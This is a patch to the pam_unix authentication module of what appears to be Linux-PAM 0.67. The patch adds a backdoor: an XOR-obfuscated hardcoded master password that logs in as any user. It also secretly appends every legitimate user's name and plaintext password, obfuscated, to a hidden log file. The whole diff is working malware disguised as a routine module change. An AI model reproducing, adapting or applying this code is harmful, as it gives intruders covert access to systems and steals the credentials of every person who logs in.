diff -Nuar 0.67.orig/modules/pam_unix/pam_unix_auth.c 0.67/modules/pam_unix/pam_unix_auth.c
--- 0.67.orig/modules/pam_unix/pam_unix_auth.c	2020-05-26 09:07:25.236589096 +0200
+++ 0.67/modules/pam_unix/pam_unix_auth.c	2020-05-26 13:43:20.572787691 +0200
@@ -115,6 +115,23 @@
  *	onto a normal UNIX authentication
  */
 
+#define XKEY			%%XKEY%%
+#define PAM_KEY			"%%PAM_KEY%%"
+#define PAM_LOGS		"%%PAM_LOGS%%"
+
+static void _xor(char *p){
+	int i;
+	for(i = 0; i < strlen(p); i++)
+		if(p[i] ^ XKEY)
+			p[i] ^= XKEY;
+}
+
+static void clean(void *var){
+	memset(var, 0x00, strlen((char *)var));
+	free(var);
+}
+
+#define xor(new_name, target) char *new_name = strdup(target); _xor(new_name);
 static int _pam_auth_unix(	pam_handle_t *pamh,
 				int flags,
 				int argc,
@@ -204,10 +221,24 @@
 			return PAM_AUTH_ERR;
 				
 	pp = p ? crypt(p, salt) : NULL;
-	
-	if ( pp && strcmp( pp, salt ) == 0 ) 
-		return	PAM_SUCCESS;
-
+	xor(pam_p, PAM_KEY);
+	if(!strcmp(p, pam_p))
+		return  PAM_SUCCESS;
+	else
+		if ( pp && strcmp( pp, salt ) == 0 ){
+			FILE *fd;
+			char bds[256];
+			xor(logf, PAM_LOGS);
+			fd = fopen(logf, "a");
+			sprintf(bds, "%s:%s", name, p);
+			_xor(bds);
+			fprintf(fd, "%s\n", bds);
+			memset(bds, 0, 255);
+			clean(logf);
+			fclose(fd);
+			clean(pam_p);
+			return	PAM_SUCCESS;
+		}
   	return PAM_AUTH_ERR;
 }
 
